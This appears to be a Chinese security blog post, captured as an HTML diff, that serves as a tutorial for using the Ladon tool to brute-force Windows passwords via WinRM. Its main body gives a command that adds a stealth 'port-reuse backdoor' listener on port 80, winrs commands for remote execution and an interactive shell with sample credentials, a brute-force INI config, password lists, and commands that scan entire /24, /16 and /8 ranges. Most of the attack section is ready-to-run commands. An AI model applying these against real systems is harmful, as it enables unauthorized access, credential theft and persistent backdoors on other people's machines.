@@ -1,0 +1,392 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="Ladon,brute force">
+
+
+<meta name="description" content=" 
+
+
+
+简介WinRM是WindowsRemoteManagementd（win远程管理）的简称。基于Web服务管理(WS-Management)标准，使用80端口或者443端口。这样一来，我...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    〖教程〗Ladon调用Winrm批量爆破Windows登陆密码 |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+</html>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" data-original="https://s2.ax1x.com/2020/01/12/lTggg0.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="〖教程〗Ladon调用Winrm批量爆破Windows登陆密码">
+            
+            〖教程〗Ladon调用Winrm批量爆破Windows登陆密码
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/Brute/">Brute</a> <a class="category-link" href="/categories/Ladon/">Ladon</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-link" href="/tags/Ladon/" rel="tag">Ladon</a> <a class="tag-link" href="/tags/brute-force/" rel="tag">brute force</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2020/05/18</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p style="color:#fff;"> 
+<% <span class="archive-article-date">
+Visit <span id="busuanzi_value_page_pv"></span>
+
+%>
+</%></p>
+
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>WinRM是WindowsRemoteManagementd（win远程管理）的简称。基于Web服务管理(WS-Management)标准，使用80端口或者443端口。这样一来，我们就可以在对方有设置防火墙的情况下远程管理这台服务器了。</p>
+<p>Server2008R2及往上的系统中默认中都开启该服务，从Server2012系统后开始，该WinRM服务便被设置为默认开启。Win7系统中却默认安装此WinRM服务，但是默认为禁用状态，Win8系统和Win10系统也都默认开启WinRM服务。</p>
+<p>PS：WIN7或2008需要手动开户WINRM</p>
+<h3 id="默认端口"><a href="#默认端口" class="headerlink" title="默认端口"></a>默认端口</h3><p>5985/tcp (HTTP)<br>5986/tcp (HTTPS)</p>
+<h3 id="端口复用后门"><a href="#端口复用后门" class="headerlink" title="端口复用后门"></a>端口复用后门</h3><p>对于Windows Server 2012以上的服务器操作系统中，WinRM服务默认启动并监听了5985端口。<br>通过下面的命令，可以新增WinRM一个80端口的监听。<br>winrm set winrm/config/service @{EnableCompatibilityHttpListener=”true”}</p>
+<p>PS：该方法适用于有web的机器，不会开启新端口，也不需要EXE进程或DLL劫持。</p>
+<h3 id="远程执行命令"><a href="#远程执行命令" class="headerlink" title="远程执行命令"></a>远程执行命令</h3><p>通过WinRM连接，并执行whoami命令<br>winrs -r:<a href="http://192.168.1.20" target="_blank" rel="noopener">http://192.168.1.20</a> -u:k8gege -p:k8gege520 whoami</p>
+<p>通过WinRM连接，并获得交互式的shell<br>winrs -r:<a href="http://192.168.1.20" target="_blank" rel="noopener">http://192.168.1.20</a> -u:k8gege -p:k8gege520 cmd</p>
+<h3 id="调用winrm爆破"><a href="#调用winrm爆破" class="headerlink" title="调用winrm爆破"></a>调用winrm爆破</h3><p>由于C#使用WSMan来访问winrm均在各种问题，还不如系统自带命令winrs。<br>当前机器为中文，目标为英文系统，连接提示编码问题，设置对应编码即可<br>其它语言系统，返回不一定是437，具体自行根据需要修改INI脚本。</p>
+<h5 id="WinrmScan-ini"><a href="#WinrmScan-ini" class="headerlink" title="WinrmScan.ini"></a>WinrmScan.ini</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line"><span class="comment">#Brute-Force WinRM</span></span><br><span class="line">exe=cmd.exe</span><br><span class="line">arg=/c <span class="string">"chcp 437 &amp; winrs -r:http://<span class="variable">$ip</span>$:5985 -u:<span class="variable">$user</span>$ -p:<span class="variable">$pass</span>$ "</span><span class="built_in">echo</span> isok<span class="string">""</span></span><br><span class="line"><span class="comment">#exe=WinrmScan.exe</span></span><br><span class="line"><span class="comment">#arg=$ip$ $user$ $pass$</span></span><br><span class="line">port=5985</span><br><span class="line">isok=isok</span><br><span class="line"><span class="built_in">log</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>注意：INI脚本必须为ANSI编码，当前机器与目标必须启用WINRM，且放行5985端口<br>后门：如果被别人添加了复用后门，也可以直接爆破80端口，把5985改成80即可。</p>
+<h3 id="SSH密码爆破-暴力破解"><a href="#SSH密码爆破-暴力破解" class="headerlink" title="SSH密码爆破/暴力破解"></a>SSH密码爆破/暴力破解</h3><h4 id="配置密码爆破参数"><a href="#配置密码爆破参数" class="headerlink" title="配置密码爆破参数"></a>配置密码爆破参数</h4><p>INI脚本仅支持标准的user.txt和pass.txt帐密破解</p>
+<h5 id="user-amp-pass-传统帐密"><a href="#user-amp-pass-传统帐密" class="headerlink" title="user &amp; pass /传统帐密"></a>user &amp; pass /传统帐密</h5><p>user.txt<br>k8gege<br>root</p>
+<p>pass.txt<br>toor<br>k8gege520</p>
+<h4 id="指定IP"><a href="#指定IP" class="headerlink" title="指定IP"></a>指定IP</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8 WinrmScan.ini</span><br></pre></td></tr></table></figure>
+
+<h4 id="扫描C段"><a href="#扫描C段" class="headerlink" title="扫描C段"></a>扫描C段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/c WinrmScan.ini</span><br><span class="line">Ladon 192.168.1.8/24 WinrmScan.ini</span><br></pre></td></tr></table></figure>
+
+<h4 id="扫描B段"><a href="#扫描B段" class="headerlink" title="扫描B段"></a>扫描B段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/b WinrmScan.ini</span><br></pre></td></tr></table></figure>
+
+<h4 id="扫描A段"><a href="#扫描A段" class="headerlink" title="扫描A段"></a>扫描A段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/a WinrmScan.ini</span><br></pre></td></tr></table></figure>
+
+<h4 id="批量IP"><a href="#批量IP" class="headerlink" title="批量IP"></a>批量IP</h4><p>ip.txt<br>192.168.1.8<br>192.168.1.5<br>192.168.1.109:48</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon WinrmScan.ini</span><br></pre></td></tr></table></figure>
+
+<h4 id="批量C段"><a href="#批量C段" class="headerlink" title="批量C段"></a>批量C段</h4><p>ip24.txt<br>192.168.1.<br>10.1.5.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon WinrmScan.ini</span><br></pre></td></tr></table></figure>
+
+<h4 id="批量B段"><a href="#批量B段" class="headerlink" title="批量B段"></a>批量B段</h4><p>ip16.txt<br>192.168.<br>10.1.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon  WinrmScan.ini</span><br></pre></td></tr></table></figure>
+
+<p>如图，通过5985端口扫描1.20机器登陆口令<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/WinrmScan.PNG"></p>
+<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download/Ladon.rar">https://k8gege.org/Download/Ladon.rar</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
+
+    </div>
+    
+    <div class="reward" ontouchstart>
+    <div class="reward-wrap">
+	<img height="70" width="70" data-original="../img/join.png">
+
+    </div>
+    <p class="reward-tip">
+        ~进群讨论
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    
+    <a href="/p/sshscan.html" class="next-post btn btn-default" title="〖教程〗Windows下使用Ladon批量爆破SSH弱口令">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            〖教程〗Windows下使用Ladon批量爆破SSH弱口令</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<p>评论系统未开启，无法评论！</p>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#默认端口"><span class="toc-text">默认端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口复用后门"><span class="toc-text">端口复用后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程执行命令"><span class="toc-text">远程执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#调用winrm爆破"><span class="toc-text">调用winrm爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#WinrmScan-ini"><span class="toc-text">WinrmScan.ini</span></a></li></ol></li></ol><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH密码爆破-暴力破解"><span class="toc-text">SSH密码爆破&#x2F;暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#配置密码爆破参数"><span class="toc-text">配置密码爆破参数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#user-amp-pass-传统帐密"><span class="toc-text">user &amp; pass &#x2F;传统帐密</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#指定IP"><span class="toc-text">指定IP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#扫描C段"><span class="toc-text">扫描C段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#扫描B段"><span class="toc-text">扫描B段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#扫描A段"><span class="toc-text">扫描A段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#批量IP"><span class="toc-text">批量IP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#批量C段"><span class="toc-text">批量C段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#批量B段"><span class="toc-text">批量B段</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#工具下载"><span class="toc-text">工具下载</span></a></li>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+<script type="text/javascript" src="http://apps.bdimg.com/libs/jquery-lazyload/1.9.5/jquery.lazyload.min.js"></script>
+    <script type="text/javascript">
+      $(function() {        
+          $("img").lazyload({
+            placeholder:"/img/loading.gif",
+              effect:"fadeIn"
+            });
+          });
+    </script>
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy;
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/tagcanvas.min.js?rev=2.9.js"></script>
+
+<script>
+var tagOption = {
+    textColour: '#444', // 字体颜色
+    outlineMethod: 'block', // 选中模式
+    outlineColour: '#FFDAB9', // 选中模式的颜色
+    interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+    textHeight: 13,
+    outlineRadius: 3,
+    freezeActive: true || '', // 选中的标签是否继续滚动
+    frontSelect: true || '', // 不选标签云后部的标签
+    initial: [0.1, -0.1],
+    depth: 0.5,
+    decel: 0.95,
+    maxSpeed: 0.03,
+    reverse: true || '', // 是否反向触发
+    fadeIn: 500, // 进入动画时间
+    wheelZoom: false || '' // 是否启用鼠标滚轮
+}
+TagCanvas.Start('tag-cloud-3d', '', tagOption);
+</script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+</body>
